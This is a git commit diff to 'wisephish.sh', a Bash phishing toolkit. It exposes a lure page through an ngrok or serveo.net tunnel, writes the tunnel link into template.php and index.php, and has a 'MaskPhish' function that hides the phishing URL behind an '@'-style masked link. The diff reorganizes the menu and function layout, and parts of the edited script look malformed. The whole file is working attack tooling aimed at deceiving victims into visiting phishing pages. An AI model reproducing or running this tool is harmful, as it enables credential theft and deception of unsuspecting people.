623139f5b8f4d8f671707dc2ac8cf867aeaad64f
mjk11958 <73896261+mjk11958@users.noreply.github.com>
2021-02-03 03:47:27 +0200

    Update wisephish.sh

--- wisephish.sh
+++ wisephish.sh
@@ -1,17 +1,19 @@
 #!/bin/bash
 # Inspired by: github.com/ALKR-HACKHECKZ/wishfish
 # Modified by: github.com/mjk11958/WisePhish
+# Bash Script for Hide Phishing URL Created by KP
 
 trap 'printf "\n";stop' 2
 
 banner() {
 
 clear
-
-printf "\e[1;77m Beta Version 1.1 Official (02/2021) \e[0m \n"
+echo -e "\033[31m █░█░█ █ █▀ █▀▀ █▀█ █░█ █ █▀ █░█";
+echo -e "\033[31m ▀▄▀▄▀ █ ▄█ ██▄ █▀▀ █▀█ █ ▄█ █▀█";
+printf "\e[1;77m Official Version 1.1 \e[0m \n"
 printf "\e[1;77m Coded By MJK11958 \e[0m \n"
 printf "\e[1;77m MaskPhish By jaykali \e[0m \n"
-
+printf "\e[1;77m Go to github.com/mjk11958/WisePhish/issues if you find any issues \e[0m \n"
 }
 
 stop() {
@@ -78,36 +80,6 @@ done
 
 }
 
-
-server() {
-
-command -v ssh > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }
-
-printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Starting Serveo...\e[0m\n"
-
-if [[ $checkphp == *'php'* ]]; then
-killall -2 php > /dev/null 2>&1
-fi
-
-if [[ $subdomain_resp == true ]]; then
-
-$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R '$subdomain':80:localhost:3333 serveo.net  2> /dev/null > sendlink ' &
-
-sleep 8
-else
-$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:3333 serveo.net 2> /dev/null > sendlink ' &
-
-sleep 8
-fi
-printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Starting php server... (localhost:3333)\e[0m\n"
-fuser -k 3333/tcp > /dev/null 2>&1
-php -S localhost:3333 > /dev/null 2>&1 &
-sleep 3
-send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
-printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Direct link:\e[0m\e[1;77m %s\n' $send_link
-
-}
-
 payload_ngrok() {
 
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
@@ -116,6 +88,8 @@ sed 's+forwarding_link+'$link'+g' template.php > index.php
 
 
 }
+
+
 
 ngrok_server() {
 
@@ -166,24 +140,23 @@ printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link
 payload_ngrok
 checkfound
 }
-
 start1() {
 if [[ -e sendlink ]]; then
 rm -rf sendlink
 fi
 
 printf "\n"
-printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
-printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m MaskPhish\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m MaskPhish\e[0m\n"
 default_option_server="1"
 read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a Port Forwarding option: \e[0m' option_server
 option_server="${option_server:-${default_option_server}}"
-if [[ $option_server -eq 1 ]]; then
-
+if [[ $option_server -eq 2 ]]; then
+maskphish
 command -v php > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }
 start
 
-elif [[ $option_server -eq 2 ]]; then
+elif [[ $option_server -eq 1 ]]; then
 ngrok_server
 sleep 1
 clear
@@ -192,58 +165,14 @@ fi
 
 }
 
-# Bash Script for Hide Phishing URL Created by KP
-
-
-
-
-payload() {
-
-send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
-
-sed 's+forwarding_link+'$send_link'+g' wisephish.html > index2.html
-sed 's+forwarding_link+'$send_link'+g' template.php > index.php
-
-
-}
-
-start() {
-
-default_choose_sub="Y"
-default_subdomain="wisephish$RANDOM"
-
-printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Choose subdomain? (Default:\e[0m\e[1;77m [Y/n] \e[0m\e[1;33m): \e[0m'
-read choose_sub
-choose_sub="${choose_sub:-${default_choose_sub}}"
-if [[ $choose_sub == "Y" || $choose_sub == "y" || $choose_sub == "Yes" || $choose_sub == "yes" ]]; then
-subdomain_resp=true
-printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Subdomain: (Default:\e[0m\e[1;77m %s \e[0m\e[1;33m): \e[0m' $default_subdomain
-read subdomain
-subdomain="${subdomain:-${default_subdomain}}"
-fi
-
-server
-payload
-checkfound
-
-}
-
-banner
-dependencies
-start1
-
-if [[ $option_server -eq 3 ]]; then url_checker
-
-
-url_checker() {
-    if [ ! "${1//:*}" = http ]; then
+maskphish() {
+url_checker() 
+if [ ! "${1//:*}" = http ]; then
         if [ ! "${1//:*}" = https ]; then
             echo -e "\e[31m[!] Invalid URL. Please use http or https.\e[0m"
             exit 1
         fi
     fi
-
-
 echo -e "\n\e[1;31;42m######┌──────────────────────────┐##### \e[0m"
 echo -e "\e[1;31;42m######│▙▗▌      ▌  ▛▀▖▌  ▗    ▌  │##### \e[0m"
 echo -e "\e[1;31;42m######│▌▘▌▝▀▖▞▀▘▌▗▘▙▄▘▛▀▖▄ ▞▀▘▛▀▖│##### \e[0m"
@@ -275,3 +204,9 @@ echo -e "\nGenerating MaskPhish Link...\n"
 final=$mask-$words@$shorter
 echo -e "Here is the MaskPhish URL:\e[32m ${final} \e[0m\n"
 
+}
+
+banner
+dependencies
+start1
+url_checker
